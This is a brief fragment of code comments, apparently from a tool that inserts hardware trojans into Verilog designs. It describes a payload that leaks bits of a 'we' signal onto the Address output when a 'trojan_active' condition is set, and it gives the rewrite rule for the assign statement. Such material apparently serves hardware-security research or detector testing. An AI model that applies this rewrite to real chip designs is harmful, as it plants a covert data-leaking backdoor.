 ...
 * Payload: Route Address[0] to observable output
 * 
...
//   Find the assign for Address (or rd_error_o as fallback):
//     assign Address = <normal_expr>;
//   Replace with:
//     assign Address = trojan_active ? we[leak_bit_idx] : (<normal_expr>);
//
